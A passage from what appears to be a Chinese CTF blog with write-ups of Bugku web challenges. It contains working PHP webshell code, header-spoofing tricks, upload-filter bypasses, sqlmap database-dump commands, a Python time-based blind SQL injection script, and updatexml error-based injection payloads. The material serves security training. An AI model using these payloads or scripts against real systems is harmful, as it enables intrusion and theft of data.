<p>这不正是我们要解决的输出flag.php内容的情况吗？？？</p>
<p>所以我们要构造一个Flag类型的参数，并把这个参数传给password然后get进去。并且这个file的值要是hint.php（因为要利用hint.php中的函数），即：——根据php序列化的结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">    class Flag&#123;</span><br><span class="line">    public $file;    </span><br><span class="line">    &#125;    </span><br><span class="line">  </span><br><span class="line">    $a &#x3D; new Flag();  </span><br><span class="line">    $a-&gt;file &#x3D; &quot;flag.php&quot;;  </span><br><span class="line">    $a &#x3D; serialize($a);  </span><br><span class="line">    print_r($a);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p> 得到：　　O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}  传入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607190756684.png" alt="image-20200607190756684"></p>
<p>得到</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607190814885.png" alt="image-20200607190814885"></p>
<h4 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607174619683.png" alt="image-20200607174619683"></p>
<p>查看原始页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607174643967.png" alt="image-20200607174643967"></p>
<p>可以看到题目中给的提示</p>
<p>使用explode函数将poc变量里的#进行截断，然后将分离出来的值放到数组中，得到assert</p>
<p><code>exlpde()分割a#s#s#e#r#t 为 assert</code></p>
<p>用assert函数来解析传进来的字符，assert有代码执行漏洞。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$poc&#x3D;&quot;a#s#s#e#r#t&quot;;</span><br><span class="line">$poc_1&#x3D;explode(&quot;#&quot;,$poc); $poc_2&#x3D;$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[&#39;s&#39;])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>构造Payload：<code>http://123.206.87.240:8010/?s=print_r(scandir(&#39;./&#39;))</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607175205721.png" alt="image-20200607175205721"></p>
<p>可以看到里面有f94lag.txt文件，在url中添加改文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607175305991.png" alt="image-20200607175305991"></p>
<h4 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h4><p>打开页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527155731657.png" alt="image-20200527155731657"></p>
<p>查看源页面，可以看到有正则匹配然后构造Payload:<code>keykeykeykeykeykeykeykeykeykey:///keykeykeyx&quot;i</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527155822458.png" alt="image-20200527155822458"></p>
<p>成功返回KEY值</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527160225084.png" alt="image-20200527160225084"></p>
<h4 id="前女友-SKCTF"><a href="#前女友-SKCTF" class="headerlink" title="前女友(SKCTF)"></a>前女友(SKCTF)</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607192732367.png" alt="image-20200607192732367"></p>
<p>查看原始页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607192825276.png" alt="image-20200607192825276"></p>
<p>点击<strong>链接</strong>这两个字。</p>
<p>发现一段代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607193505347.png" alt="image-20200607193505347"></p>
<p>里面有MD5，MD5是不能处理数组的，所以构造Payload：<code>v1[]=1&amp;v2[]=2&amp;v3[]=3</code>，然后返回flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607193720093.png" alt="image-20200607193720093"></p>
<h4 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h4><p>打开网址，可以看到题目提示SQL注入约束攻击</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527160418382.png" alt="image-20200527160418382"></p>
<p>SQL约束攻击：在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。</p>
<p>我们尝试了暴力破解等，发现并不能破解出来，我们知道像这种管理后台用户名是admin毋庸置疑，所以利用SQL约束攻击的特性进行攻击，注册用户</p>
<p>更改了Type让其显示输入的密码，点击注册</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527172806930.png" alt="image-20200527172806930"></p>
<p>返回了注册成功，等两秒就会返回登录界面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527172857635.png" alt="image-20200527172857635"></p>
<p>在登录界面输入刚才注册的用户名和密码，成功返回。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527173023123.png" alt="image-20200527173023123"></p>
<h4 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527174500035.png" alt="image-20200527174500035"></p>
<p>返回了 Are you from google？(你是谷歌的吗？)</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527174604248.png" alt="image-20200527174604248"></p>
<p>到这就可以看出，上面是需要我们伪造一下链接Referer</p>
<p>Payload：<code>https://www.google.com</code></p>
<p>你是无法在页面中更改的，所以使用burp抓包，然后发送的Repeater中进行更改运行。</p>
<p>成功返回flag，复制提交就ok</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527174851825.png" alt="image-20200527174851825"></p>
<h4 id="md5-collision-NUPT-CTF"><a href="#md5-collision-NUPT-CTF" class="headerlink" title="md5 collision(NUPT_CTF)"></a>md5 collision(NUPT_CTF)</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527180144324.png" alt="image-20200527180144324"></p>
<p>原始页面，让其输入a，我们输入?a=1查看返会结果</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527180242821.png" alt="image-20200527180242821"></p>
<p>返回false说明错误。这里已经已经看过了burp抓包和F12了，什么都没有。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527180318161.png" alt="image-20200527180318161"></p>
<p>当我看看题目的时候发现题目是MD5碰撞，我们百度一下什么是MD5碰撞</p>
<p>解释是：</p>
<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
<p>攻击者可以利用这一漏洞，通过输入一个经过哈希后以”0E”开头的字符串，即会被PHP解释为0，如果数据库中存在这种哈希值以”0E”开头的密码的话，他就可以以这个用户的身份登录进去，尽管并没有真正的密码。</p>
<p>原文链接：<a href="https://blog.csdn.net/qq_30464257/article/details/81432446" target="_blank" rel="noopener">https://blog.csdn.net/qq_30464257/article/details/81432446</a></p>
<p>其中常见的MD5碰撞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0e开头的md5和原值：</span><br><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure>

<p>以上的MD5碰撞哪一个都行，所以我们只要随便复制一个就可以。复制提交就可以。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527180825418.png" alt="image-20200527180825418"></p>
<h4 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528081646555.png" alt="image-20200528081646555"></p>
<p>显示原始页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528081720351.png" alt="image-20200528081720351"></p>
<p>显示从本地访问，这样肯明显就需伪造一下IP，当然想要我在IP的话就需要用burp进行抓包修改运行</p>
<p>将抓取的数据包发送到Repeter模块，在其中加入X-Forwarded-for:127.0.0.1</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528081836626.png" alt="image-20200528081836626"></p>
<p>这样就成功显示flag了，直接复制提交就OK</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528082002023.png" alt="image-20200528082002023"></p>
<h4 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528084108275.png" alt="image-20200528084108275"></p>
<p>查看原始页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528084159215.png" alt="image-20200528084159215"></p>
<p>从以上代码分析，可以看到几条有用的信息</p>
<p>1、使 uname的sha1值 与 passwd的sha1的值 相等</p>
<p>2、但是同时 uname 和 passwd两个的值又不能相等</p>
<p>3、id == “margin”</p>
<p>解决办法</p>
<p>1、GTE输入的有uname和id，POST输出的是passwd</p>
<p>2、把 uname 和 passwd定义成数组，数组的哈希值相同</p>
<p>3、id等于margin</p>
<p>在页面中输入，复制提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528084608223.png" alt="image-20200528084608223"></p>
<h4 id="Web-8"><a href="#Web-8" class="headerlink" title="Web 8"></a>Web 8</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528090245666.png" alt="image-20200528090245666"></p>
<p>原始页面，代码审计</p>
<p>题目上显示txt？？？？，尝试访问flag.txt看看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528090259220.png" alt="image-20200528090259220"></p>
<p>返回了内容flags。对代码进行分析</p>
<p>$ac===$f，结合其他代码说明$f是文件名，$ac是文件内容，只有这样他们才能全等于</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528090404175.png" alt="image-20200528090404175"></p>
<p>这样就在URL中构造payload</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528090629300.png" alt="image-20200528090629300"></p>
<p>还有一种方法。</p>
<p>1、ac不能为空</p>
<p>2、f的值从fn中获取的</p>
<p>3、ac的值要全等于f</p>
<p>构造payload<code>?ac=123&amp;fn=php://input,,,,[PSOT]123</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528091050880.png" alt="image-20200528091050880"></p>
<h4 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528091630704.png" alt="image-20200528091630704"></p>
<p>查看原始页面，可以发现是404页面，显示错误。因为是直接显示错误，抓包什么的没有任何有用的内容<img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528091651242.png" alt="image-20200528091651242"></p>
<p>使用御剑扫描一下发现了这两个网站，第2个因为是index.php结尾，就是我们的初始访问的404页面所以无用，那就是第一个了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528091927004.png" alt="image-20200528091927004"></p>
<p>访问第一个网站，这是初始界面，可以看到给了一个resusl.php的文件，尝试访问一下。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528092053317.png" alt="image-20200528092053317"></p>
<p>居然进入到了后台，可以看到屏幕中显示你不是管理员你的IP已经被记录到日志了。<img src="https://gitee.com/zhanqiaozai/picture/raw/master/0064D4DD.gif" alt="img"></p>
<p>卧槽，被记录了，但是在左下角有一串代码，而且题目给的提示是：想办法变成admin，尝试一下<code>?x=admin</code>试试，看看能否访问</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528092201182.png" alt="image-20200528092201182"></p>
<p>发现成功访问了，复制提交即可。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528092535147.png" alt="image-20200528092535147"></p>
<h4 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h4><p>打开网页</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528210230364.png" alt="image-20200528210230364"></p>
<p>查看原始页面，可以看到，标题让上传图片而不是php，这一看就是文件上传，构造一个文件上传的payload</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528210252464.png" alt="image-20200528210252464"></p>
<p>将其文件名改为png，jpg等图片文件后缀，然后进行上传</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528210430305.png" alt="image-20200528210430305"></p>
<p>上传后返回了图片上传的路径，复制路径到URL中，进行访问，看能否出现空白图片，因为这是伪造的图片所以是空白的不会显示任何内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528210730378.png" alt="image-20200528210730378"></p>
<p>将文件放到URL后，返回了空白图片，右键复制图片地址在菜刀或者蚁剑连接。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528210816733.png" alt="image-20200528210816733"></p>
<p>发现不管是蚁剑还是菜刀都连接不上，不管怎样修改都连接不上，可以猜测图片到后台被删除了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528210853780.png" alt="image-20200528210853780"></p>
<p>所以我们使用另一种方法，使用burp抓包试试，这里就可以将文件后缀改为php了，抓完包后将Type改为image/jpeg就可以</p>
<p>经过测试php2, php3, php4, php5，phps, pht, phtm, phtml，只有php5才能绕过，这里用了黑名单过滤</p>
<p>请求头部的Content-Type字段，进行大小写绕过，即把multipart/form-data中任意一个字母改成大写即可绕过</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528211615205.png" alt="image-20200528211615205"></p>
<h4 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a>INSERT INTO注入</h4><p>打开网页，可以看到题目给的源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614094836949.png" alt="image-20200614094836949"></p>
<p>源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getIp()&#123;</span><br><span class="line">$ip &#x3D; &#39;&#39;;</span><br><span class="line">if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))&#123;</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr &#x3D; explode(&#39;,&#39;, $ip);</span><br><span class="line">return $ip_arr[0];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host&#x3D;&quot;localhost&quot;;</span><br><span class="line">$user&#x3D;&quot;&quot;;</span><br><span class="line">$pass&#x3D;&quot;&quot;;</span><br><span class="line">$db&#x3D;&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$connect &#x3D; mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) or die(&quot;Unable to select database&quot;);</span><br><span class="line"></span><br><span class="line">$ip &#x3D; getIp();</span><br><span class="line">echo &#39;your ip is :&#39;.$ip;</span><br><span class="line">$sql&#x3D;&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure>

<p>明确注入点，是走的http报头的x-forwarded-for。</p>
<p>我尝试了bool型注入，发现自己构造的语句在自己数据库中会报错，但是这里并没有错误报告，因此考虑基于时间的盲注</p>
<p>我之前时间延迟盲注都是用 if(exp1,exp2,epx3) 这种格式来完成的，但是这里的一段代码，相当于把 “,” 给过滤了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ip_arr &#x3D; explode(&#39;,&#39;, $ip);</span><br><span class="line">return $ip_arr[0];</span><br></pre></td></tr></table></figure>

<p>于是改变方法，用 case when exp1 then sleep(4) else 1 end 来绕过 “,”的限制</p>
<p>exp1 中要用到substr来进行剪切，这个函数substr(str,1,1) 又是存在 “,” , 于是这里我又用 substr (str) from 1 for 1 来绕过 “,”的限制</p>
<p>又拼接的语句为value(‘ 输入的内容 ‘)，最后的poc为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and (case when (length((select database())) &#x3D; 14) then sleep(4) else 1 end) #</span><br><span class="line"></span><br><span class="line">1&#39; and (case when (substr(select database())  from 1 for 1)&#x3D;&#39;c&#39; then sleep(4) else 1 end) #</span><br></pre></td></tr></table></figure>

<p>构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into client_ip (ip) values (&#39;  1&#39; and (case when (length((select database())) &#x3D; 14) then sleep(4) else 1 end) --  &#39;)</span><br></pre></td></tr></table></figure>

<p>Python脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"># 基于时间的盲注，过滤了逗号 ,</span><br><span class="line">sql &#x3D; &quot;127.0.0.1&#39;+(select case when substr((select flag from flag) from &#123;0&#125; for 1)&#x3D;&#39;&#123;1&#125;&#39; then sleep(5) else 0 end))-- +&quot;</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web15&#x2F;&#39;</span><br><span class="line"></span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in range(1, 40):</span><br><span class="line">    print(&#39;正在猜测：&#39;, str(i))</span><br><span class="line">    for ch in range(32, 129):</span><br><span class="line">        if ch &#x3D;&#x3D; 128:</span><br><span class="line">            sys.exit(0)</span><br><span class="line">        sqli &#x3D; sql.format(i, chr(ch))</span><br><span class="line">        # print(sqli)</span><br><span class="line">        header &#x3D; &#123;</span><br><span class="line">            &#39;X-Forwarded-For&#39;: sqli</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            html &#x3D; requests.get(url, headers&#x3D;header, timeout&#x3D;3)</span><br><span class="line">        except:</span><br><span class="line">            flag +&#x3D; chr(ch)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p>最终得出结果是MD5值，解密就ok</p>
<h4 id="这是一个神奇的登录框"><a href="#这是一个神奇的登录框" class="headerlink" title="这是一个神奇的登录框"></a>这是一个神奇的登录框</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614095950785.png" alt="image-20200614095950785"></p>
<p>查看源码</p>
<p>是post提交，url明显提示是个sql注入，由于post提交，要sql和burp结合起来使用。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614115515525.png" alt="image-20200614115515525"></p>
<p>首先burp抓包，抓到包后选择存到txt文件中：（随便输入账号密码）</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614115612664.png" alt="image-20200614115612664"></p>
<p>我保存到了D盘的1.txt里。</p>
<p>然后打开sqlmap，输入指令：<code>sqlmap.py -r &quot;D:\1.txt&quot; -p admin_name --dbs</code></p>
<p>解释一下 -r是读文件 后面是刚才保存的绝对路径，-p是参数，也就是注入点（选了admin_name是注入点） –dbs意思是想获取数据库名字</p>
<p>可以看到sqlmap获得了数据库的名字：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614115646317.png" alt="image-20200614115646317"></p>
<p>应该是这个bugkul1，再继续爆表，命令：<code>sqlmap.py -r &quot;D:\1.txt&quot; -D bugkusql1 -p admin_name --tables</code></p>
<p>解释：-D是表示选择了后面的这个数据库 –tables是想获取表</p>
<p>可以看到爆出了表：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614115709079.png" alt="image-20200614115709079"></p>
<p>应该在flag1这个表里，继续爆列名：</p>
<p>命令：<code>sqlmap.py -r &quot;D:\1.txt&quot; -D bugkusql1 -T flag1 -p admin_name --columns</code></p>
<p>解释类似上面 不过加了一个-T 指定表</p>
<p>可以发现爆出了列名：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614115723998.png" alt="image-20200614115723998"></p>
<p>flag1这个列 最后查字段 命令：<code>sqlmap.py -r &quot;D:\1.txt&quot; -D bugkusql1 -T flag1 -C flag1 -p admin_name --dump</code>解释：同上面 –dump是获取字段的命令（在这过程中可能会让你选择Y或者N 我直接回车的）可以看到爆出了flag：<br><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614115746599.png" alt="image-20200614115746599"></p>
<h4 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614140048911.png" alt="image-20200614140048911"></p>
<p>查看原始页面</p>
<p>可以看到URL有一个 ?id=1，一看到这个第一时间想到的就是注入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614140649361.png" alt="image-20200614140649361"></p>
<p>测试一下看看是不是</p>
<p>使用万能单引号，发现页面返回错误，说明存在SQL注入。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141003167.png" alt="image-20200614141003167"></p>
<p>使用注释符，查看页面返回，发现使用<code>#</code>还是返回错误，说明可能是<code>#</code>这个注释符被过滤了，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141056433.png" alt="image-20200614141056433"></p>
<p>使用一下<code>--+</code>或者<code>%23</code>试试，页面返回正常。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141154522.png" alt="image-20200614141154522"></p>
<p>查看字段数</p>
<p>发现order by 都已经等于1了还是返回错误，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141234690.png" alt="image-20200614141234690"></p>
<p>使用1’ or 1=1 –+ 看看页面返回，发现or被过滤了，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141512044.png" alt="image-20200614141512044"></p>
<p>使用双写试试，页面返回正常说明可以双写绕过</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141540958.png" alt="image-20200614141540958"></p>
<p>因为不知道那些被过滤了，所以测试一下and试试</p>
<p>and也出错了，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141623783.png" alt="image-20200614141623783"></p>
<p>将and进行双写，发现页面返回正确</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141658004.png" alt="image-20200614141658004"></p>
<p>这次知道了or 和 and被过滤了，将or双写查看字段数</p>
<p>当字段为2的时候返回正常，3的时候页面返回错误</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141851898.png" alt="image-20200614141851898"></p>
<p>查看注入点，嗯？报错了，经过测试发现union select也被过滤了，也要进行双写绕过一下</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141937056.png" alt="image-20200614141937056"></p>
<p>双写绕过，注入点是2</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142045859.png" alt="image-20200614142045859"></p>
<p>查看数据库，当前数据库为<code>web1002-1</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142116577.png" alt="image-20200614142116577"></p>
<p>查看表，不要忘记information中的or双写，可以看到获得的表为<code>flag1</code>和<code>hint</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142231685.png" alt="image-20200614142231685"></p>
<p>查看flag1表中的内容，获得<code>flag1</code>and<code>address</code>这两个字段</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142336341.png" alt="image-20200614142336341"></p>
<p>查看flag1这个字段，或得内容<code>usOwycTju+FTUUzXosjr</code>，这个数据提交是错误的，所以我们试试address字段</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142432801.png" alt="image-20200614142432801"></p>
<p>查看address字段内容</p>
<p>可以看到出现了一个下一关的地址，点击。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142552844.png" alt="image-20200614142552844"></p>
<p>进去之后发现还有一个注入。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142639683.png" alt="image-20200614142639683"></p>
<p>在使用单引号</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142758306.png" alt="image-20200614142758306"></p>
<p>加注释符</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142816295.png" alt="image-20200614142816295"></p>
<p>查看字段</p>
<p>字段为2的时候返回正常</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142841780.png" alt="image-20200614142841780"></p>
<p>查看注入点，把union过滤了，双写，大写小编码等 都不能绕过，因为有报错信息，那就用报错注入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614143008009.png" alt="image-20200614143008009"></p>
<p>查看数据库</p>
<p>payload：<code>-1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</code></p>
<p>当前数据库为<code>web1002-2</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614143304362.png" alt="image-20200614143304362"></p>
<p>查看表</p>
<p>payload：<code>-1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;web1002-2&#39;),0x7e),1) --+</code></p>
<p>当前表名： ‘<del>class   ,   flag2</del>‘</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614143619524.png" alt="image-20200614143619524"></p>
<p>查看flag2表中的字段</p>
<p>payload：<code>-1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&#39;flag2&#39;),0x7e),1) --+</code></p>
<p>当前字段： ‘<del>flag2      ,    address</del>‘</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614143746058.png" alt="image-20200614143746058"></p>
<p>查看flag2字段内容</p>
<p>payload：<code>-1&#39; and updatexml(1,concat(0x7e,(select group_concat(flag2)from flag2),0x7e),1) --+</code></p>
<p>flag{Bugku-sql_6s-2i-4t-bug}</p>
<p>将B改为b因为题目要求小写，如果大写提交的话会提示错误</p>
<p>flag{bugku-sql_6s-2i-4t-bug}</p>
<p>复制提交就ok</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614143904307.png" alt="image-20200614143904307"></p>
<h4 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614155227949.png" alt="image-20200614155227949"></p>
<p>原始页面，什么也没有，查看源码看一下</p>
